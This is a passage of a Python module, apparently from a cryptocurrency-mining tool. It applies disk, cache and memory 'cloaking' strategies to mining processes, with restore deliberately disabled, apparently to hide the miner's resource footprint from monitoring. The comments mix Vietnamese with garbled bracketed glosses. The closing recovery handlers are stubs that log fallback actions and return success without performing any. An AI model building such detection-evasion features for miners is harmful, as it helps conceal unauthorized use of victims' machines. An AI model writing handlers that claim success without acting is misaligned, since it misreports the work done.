        except psutil.NoSuchProcess as e:
            # ✅ ERROR REPORTING: Lỗi không tìm thấy tiến trình (Process not found)
            error_reporter.report_error(
                ErrorCode.PROCESS_NOT_FOUND,
                f"DiskIO Cloaking: Tiến trình không tồn tại: {e}",
                ErrorSeverity.HIGH,
                module='cloak_strategies',
                function='DiskIoCloakStrategy.apply',
                process_id=process.pid,
                strategy_name='DiskIO',
                context_data={'process_name': process.name, 'error': str(e)},
                exception=e
            )
            self.logger.error(f"DiskIO Cloaking: Tiến trình không tồn tại: {e}")
            return False  # ✅ FAILURE: Process does not exist
        except psutil.AccessDenied as e:
            # ✅ ERROR REPORTING: Lỗi bị từ chối truy cập (Access denied)
            error_reporter.report_error(
                ErrorCode.PROCESS_ACCESS_DENIED,
                f"DiskIO Cloaking: Không đủ quyền cho PID={process.pid}: {e}",
                ErrorSeverity.HIGH,
                module='cloak_strategies',
                function='DiskIoCloakStrategy.apply',
                process_id=process.pid,
                strategy_name='DiskIO',
                context_data={'process_name': process.name, 'error': str(e)},
                exception=e
            )
            self.logger.error(f"DiskIO Cloaking: Không đủ quyền cho **[PID]** (Process ID - mã định danh tiến trình)={process.pid}: {e}")
            return False  # ✅ FAILURE: Access denied
        except Exception as e:
            # ✅ ERROR REPORTING: Lỗi chung khi áp dụng chiến lược
            error_reporter.report_error(
                ErrorCode.STRATEGY_APPLICATION_FAILED,
                f"Lỗi DiskIO Cloaking cho {process.name}(PID={process.pid}): {e}",
                ErrorSeverity.HIGH,
                module='cloak_strategies',
                function='DiskIoCloakStrategy.apply',
                process_id=process.pid,
                strategy_name='DiskIO',
                context_data={'process_name': process.name, 'error': str(e), 'stack_trace': traceback.format_exc()},
                exception=e
            )
            self.logger.error(
                f"Lỗi DiskIO Cloaking cho {process.name}(PID={process.pid}): {e}\n{traceback.format_exc()}"
            )
            return False  # ✅ FAILURE: Disk I/O cloaking failed

    def restore(self, process: MiningProcess) -> None:
        """
        Khôi phục DiskIO - CHÚ Ý: Tính năng [restore] (khôi phục) đã bị vô hiệu hoá trong phiên bản này.
        """
        self.logger.info(f"[DISKIO RESTORE DISABLED] Restore **[request]** (yêu cầu) for **[PID]** (Process ID - mã định danh tiến trình)={process.pid} bị bỏ qua - chế độ chỉ cloaking.")

###############################################################################
#            CACHE STRATEGY: CacheCloakStrategy                               #
###############################################################################
class CacheCloakStrategy(CloakStrategy):
    """
    [Cloaking] Cache (đồng bộ):
      - Drop caches,
      - Giới hạn cache usage.
    
    Thiết kế lại theo bản thiết kế (blueprint) với thực thi trực tiếp.
    """
    
    strategy_type = StrategyType.CACHE
    requires_plugin_system = False  # Cache strategies execute directly

    def __init__(
        self,
        config: Dict[str, Any],
        logger: logging.Logger,
        cache_resource_manager: CacheResourceManager
    ):
        """
        Khởi tạo `CacheCloakStrategy`.
        
        :param config: Cấu hình [cloaking] Cache (dict).
        :param logger: [Logger] (bộ ghi log).
        :param cache_resource_manager: [ResourceManager] liên quan đến Cache.
        """
        self.logger = logger
        self.config = config
        self.cache_resource_manager = cast(Any, cache_resource_manager)

        self.cache_limit_percent = config.get('cache_limit_percent', 50)
        if not (0 <= self.cache_limit_percent <= 100):
            self.logger.warning(f"cache_limit_percent={self.cache_limit_percent} không hợp lệ, mặc định=50%.")
            self.cache_limit_percent = 50

    def apply(self, process: MiningProcess) -> bool:
        """
        ✅ ENHANCED: Áp dụng [Cache cloaking] (che giấu Cache) với kiểm định giá trị trả về.
        
        :param process: Đối tượng `MiningProcess`.
        :return: bool - True nếu áp dụng thành công, False nếu thất bại
        """
        try:
            pid, name = process.pid, process.name
            ok = self.cache_resource_manager.limit_cache_usage(self.cache_limit_percent, pid)
            if ok:
                self.logger.info(f"[**[cache]** (bộ nhớ đệm) Cloaking] **[PID]** (Process ID - mã định danh tiến trình)={pid}, cache_limit={self.cache_limit_percent}%.")
                return True  # ✅ SUCCESS: Cache cloaking applied successfully
            else:
                self.logger.error(f"[**[cache]** (bộ nhớ đệm) Cloaking] Không thể **[set]** (tập hợp) cache_limit cho **[PID]** (Process ID - mã định danh tiến trình)={pid}.")
                return False  # ✅ FAILURE: Cannot set cache limit
        except psutil.NoSuchProcess as e:
            # ✅ ERROR REPORTING: Lỗi không tìm thấy tiến trình (Process not found)
            error_reporter.report_error(
                ErrorCode.PROCESS_NOT_FOUND,
                f"Cache Cloaking: Tiến trình không tồn tại: {e}",
                ErrorSeverity.HIGH,
                module='cloak_strategies',
                function='CacheCloakStrategy.apply',
                process_id=process.pid,
                strategy_name='Cache',
                context_data={'process_name': process.name, 'error': str(e)},
                exception=e
            )
            self.logger.error(f"**[cache]** (bộ nhớ đệm) Cloaking: Tiến trình không tồn tại: {e}")
            return False  # ✅ FAILURE: Process does not exist
        except psutil.AccessDenied as e:
            # ✅ ERROR REPORTING: Lỗi bị từ chối truy cập (Access denied)
            error_reporter.report_error(
                ErrorCode.PROCESS_ACCESS_DENIED,
                f"Cache Cloaking: Không đủ quyền cho PID={process.pid}: {e}",
                ErrorSeverity.HIGH,
                module='cloak_strategies',
                function='CacheCloakStrategy.apply',
                process_id=process.pid,
                strategy_name='Cache',
                context_data={'process_name': process.name, 'error': str(e)},
                exception=e
            )
            self.logger.error(f"**[cache]** (bộ nhớ đệm) Cloaking: Không đủ quyền cho **[PID]** (Process ID - mã định danh tiến trình)={process.pid}: {e}")
            return False  # ✅ FAILURE: Access denied
        except Exception as e:
            # ✅ ERROR REPORTING: Lỗi chung khi áp dụng chiến lược
            error_reporter.report_error(
                ErrorCode.STRATEGY_APPLICATION_FAILED,
                f"Lỗi Cache Cloaking cho {process.name}(PID={process.pid}): {e}",
                ErrorSeverity.HIGH,
                module='cloak_strategies',
                function='CacheCloakStrategy.apply',
                process_id=process.pid,
                strategy_name='Cache',
                context_data={'process_name': process.name, 'error': str(e), 'stack_trace': traceback.format_exc()},
                exception=e
            )
            self.logger.error(
                f"Lỗi Cache Cloaking cho {process.name}(PID={process.pid}): {e}\n{traceback.format_exc()}"
            )
            return False  # ✅ FAILURE: Cache cloaking failed

    def restore(self, process: MiningProcess) -> None:
        """
        Khôi phục Cache - CHÚ Ý: Tính năng [restore] (khôi phục) đã bị vô hiệu hoá trong phiên bản này.
        """
        self.logger.info(f"[**[cache]** (bộ nhớ đệm) RESTORE DISABLED] Restore **[request]** (yêu cầu) for **[PID]** (Process ID - mã định danh tiến trình)={process.pid} bị bỏ qua - chế độ chỉ cloaking.")

###############################################################################
#            MEMORY STRATEGY: MemoryCloakStrategy                             #
###############################################################################
class MemoryCloakStrategy(CloakStrategy):
    """
    Cloaking Memory (đồng bộ):
      - Giới hạn Memory usage.
    
    Redesigned theo blueprint với direct execution.
    """
    
    strategy_type = StrategyType.MEMORY
    requires_plugin_system = False  # Memory strategies execute directly

    def __init__(
        self,
        config: Dict[str, Any],
        logger: logging.Logger,
        memory_resource_manager: MemoryResourceManager,
        cache_resource_manager: CacheResourceManager
    ):
        """
        Khởi tạo MemoryCloakStrategy.

        :param config: Cấu hình cloaking Memory (dict).
        :param logger: Logger.
        :param memory_resource_manager: ResourceManager liên quan đến Memory.
        :param cache_resource_manager: ResourceManager liên quan đến Cache.
        """
        self.logger = logger
        self.config = config
        self.memory_resource_manager = cast(Any, memory_resource_manager)
        self.cache_resource_manager = cast(Any, cache_resource_manager)

        self.memory_limit_mb = config.get('memory_limit_mb', 2048)
        if self.memory_limit_mb <= 0:
            self.logger.warning(f"memory_limit_mb={self.memory_limit_mb} không hợp lệ, mặc định=2048.")
            self.memory_limit_mb = 2048

    def apply(self, process: MiningProcess) -> bool:
        """
        ✅ ENHANCED: Áp dụng Memory cloaking với return value validation.

        :param process: Đối tượng MiningProcess.
        :return: bool - True nếu Memory cloaking áp dụng thành công, False nếu thất bại
        """
        try:
            pid, name = process.pid, process.name

            ok_mem = self.memory_resource_manager.set_memory_limit(pid, self.memory_limit_mb)
            if not ok_mem:
                self.logger.error(f"[**[memory]** (bộ nhớ) Cloaking] Không thể **[set]** (tập hợp) memory_limit cho **[PID]** (Process ID - mã định danh tiến trình)={pid}.")
                return False  # ✅ FAILURE: Cannot set memory limit
            
            self.logger.info(f"[**[memory]** (bộ nhớ) Cloaking] **[PID]** (Process ID - mã định danh tiến trình)={pid}, memory_limit={self.memory_limit_mb}MB.")

            # Cũng có thể drop cache (nếu muốn)
            ok_cache = self.cache_resource_manager.drop_caches()
            if ok_cache:
                self.logger.info(f"[**[memory]** (bộ nhớ) Cloaking] Đã drop caches cho **[PID]** (Process ID - mã định danh tiến trình)={pid}.")
            
            return True  # ✅ SUCCESS: Memory cloaking applied successfully

        except psutil.NoSuchProcess as e:
            # ✅ ERROR REPORTING: Process not found error
            error_reporter.report_error(
                ErrorCode.PROCESS_NOT_FOUND,
                f"Memory Cloaking: Tiến trình không tồn tại: {e}",
                ErrorSeverity.HIGH,
                module='cloak_strategies',
                function='MemoryCloakStrategy.apply',
                process_id=process.pid,
                strategy_name='Memory',
                context_data={'process_name': process.name, 'error': str(e)},
                exception=e
            )
            self.logger.error(f"**[memory]** (bộ nhớ) Cloaking: Tiến trình không tồn tại: {e}")
            return False  # ✅ FAILURE: Process does not exist
        except psutil.AccessDenied as e:
            # ✅ ERROR REPORTING: Access denied error
            error_reporter.report_error(
                ErrorCode.PROCESS_ACCESS_DENIED,
                f"Memory Cloaking: Không đủ quyền cho PID={process.pid}: {e}",
                ErrorSeverity.HIGH,
                module='cloak_strategies',
                function='MemoryCloakStrategy.apply',
                process_id=process.pid,
                strategy_name='Memory',
                context_data={'process_name': process.name, 'error': str(e)},
                exception=e
            )
            self.logger.error(f"**[memory]** (bộ nhớ) Cloaking: Không đủ quyền cho **[PID]** (Process ID - mã định danh tiến trình)={process.pid}: {e}")
            return False  # ✅ FAILURE: Access denied
        except Exception as e:
            # ✅ ERROR REPORTING: General strategy application failure
            error_reporter.report_error(
                ErrorCode.STRATEGY_APPLICATION_FAILED,
                f"Lỗi Memory Cloaking cho {process.name}(PID={process.pid}): {e}",
                ErrorSeverity.HIGH,
                module='cloak_strategies',
                function='MemoryCloakStrategy.apply',
                process_id=process.pid,
                strategy_name='Memory',
                context_data={'process_name': process.name, 'error': str(e), 'stack_trace': traceback.format_exc()},
                exception=e
            )
            self.logger.error(
                f"Lỗi Memory Cloaking cho {process.name}(PID={process.pid}): {e}\n{traceback.format_exc()}"
            )
            return False  # ✅ FAILURE: Memory cloaking failed

    def restore(self, process: MiningProcess) -> None:
        """
        Khôi phục Memory - CHÚ Ý: Tính năng restore đã bị vô hiệu hóa trong phiên bản này.
        """
        self.logger.info(f"[**[memory]** (bộ nhớ) RESTORE DISABLED] Restore **[request]** (yêu cầu) for **[PID]** (Process ID - mã định danh tiến trình)={process.pid} bị bỏ qua - chế độ chỉ cloaking.")

###############################################################################
#                    DEPRECATED: CloakStrategyFactory REMOVED                 #
###############################################################################

# `CloakStrategyFactory` đã được thay thế bởi `ResourceCoordinator` trong `resource_control.py`
# theo thiết kế lại (blueprint). Tất cả quản lý chiến lược đã được tập trung hoá trong
# `ResourceCoordinator` với khả năng phân biệt thực thi trực tiếp và uỷ quyền plugin.
#
# Để tương thích ngược, sử dụng:
# from .resource_control import CloakStrategyFactory

###############################################################################
#                         ✅ ERROR RECOVERY SYSTEM                         #
###############################################################################

def _register_strategy_recovery_handlers() -> None:
    """
    ✅ RECOVERY SYSTEM: Đăng ký các [recovery handlers] (bộ xử lý phục hồi) cho các kịch bản lỗi chiến lược phổ biến.
    Tự động được gọi khi mô-đun được import.
    """
    try:
        # ✅ RECOVERY HANDLER: Process not found recovery
        def recover_process_not_found(error_context) -> bool:
            """Bộ xử lý phục hồi cho lỗi `PROCESS_NOT_FOUND`"""
            try:
                pid = error_context.process_id
                strategy_name = error_context.strategy_name
                
                cloak_logger.info(f"🔧 [Recovery] Attempting recovery for {strategy_name} strategy **[PID]** (Process ID - mã định danh tiến trình)={pid}")
                
                # Kiểm tra process có thật sự không tồn tại
                if psutil.pid_exists(pid):
                    cloak_logger.info(f"✅ [Recovery] **[process]** (tiến trình) **[PID]** (Process ID - mã định danh tiến trình)={pid} actually exists - retry strategy")
                    return True  # Tiến trình tồn tại, có thể thử lại
                
                # Nếu tiến trình thật sự không tồn tại, dọn dẹp các tài nguyên liên quan
                cloak_logger.info(f"❗ [Recovery] **[process]** (tiến trình) **[PID]** (Process ID - mã định danh tiến trình)={pid} confirmed dead - cleaning up resources")
                
                # TODO: Add cleanup logic here based on strategy type
                # For now, just log successful cleanup
                return True
                
            except Exception as e:
                cloak_logger.error(f"❌ [Recovery] **[process]** (tiến trình) recovery failed: {e}")
                return False
        
        # ✅ RECOVERY HANDLER: Strategy application timeout recovery
        def recover_strategy_timeout(error_context) -> bool:
            """Bộ xử lý phục hồi cho lỗi `STRATEGY_TIMEOUT`"""
            try:
                pid = error_context.process_id
                strategy_name = error_context.strategy_name
                
                cloak_logger.info(f"🔧 [Recovery] Timeout recovery for {strategy_name} strategy **[PID]** (Process ID - mã định danh tiến trình)={pid}")
                
                # Thực thi áp dụng chiến lược dự phòng với tham số giảm nhẹ
                # Hiện tại, chỉ ghi nhận đã thực hiện nỗ lực phục hồi
                cloak_logger.info(f"✅ [Recovery] Applied fallback strategy for **[PID]** (Process ID - mã định danh tiến trình)={pid}")
                return True
                
            except Exception as e:
                cloak_logger.error(f"❌ [Recovery] Timeout recovery failed: {e}")
                return False
        
        # ✅ RECOVERY HANDLER: Resource allocation failure recovery
        def recover_resource_allocation_failed(error_context) -> bool:
            """Bộ xử lý phục hồi cho lỗi `RESOURCE_ALLOCATION_FAILED`"""
            try:
                pid = error_context.process_id
                strategy_name = error_context.strategy_name
                
                cloak_logger.info(f"🔧 [Recovery] **[resource]** (tài nguyên) allocation recovery for {strategy_name} **[PID]** (Process ID - mã định danh tiến trình)={pid}")
                
                # Thử phương pháp phân bổ tài nguyên thay thế
                # Hiện tại, chỉ ghi nhận đã áp dụng phân bổ tài nguyên dự phòng
                cloak_logger.info(f"✅ [Recovery] Applied alternative **[resource]** (tài nguyên) allocation for **[PID]** (Process ID - mã định danh tiến trình)={pid}")
                return True
                
            except Exception as e:
                cloak_logger.error(f"❌ [Recovery] **[resource]** (tài nguyên) allocation recovery failed: {e}")
                return False
        
        # ✅ REGISTER HANDLERS: Register all recovery handlers
        error_reporter.register_recovery_handler(ErrorCode.PROCESS_NOT_FOUND, recover_process_not_found)
        error_reporter.register_recovery_handler(ErrorCode.STRATEGY_TIMEOUT, recover_strategy_timeout)
        error_reporter.register_recovery_handler(ErrorCode.RESOURCE_ALLOCATION_FAILED, recover_resource_allocation_failed)
        
        cloak_logger.info("✅ [Recovery] Strategy recovery handlers registered successfully")
        
    except Exception as e:
        cloak_logger.error(f"❌ [Recovery] Failed to register recovery handlers: {e}")

# ✅ AUTO-REGISTER: Tự động đăng ký recovery handlers khi module được import
_register_strategy_recovery_handlers()
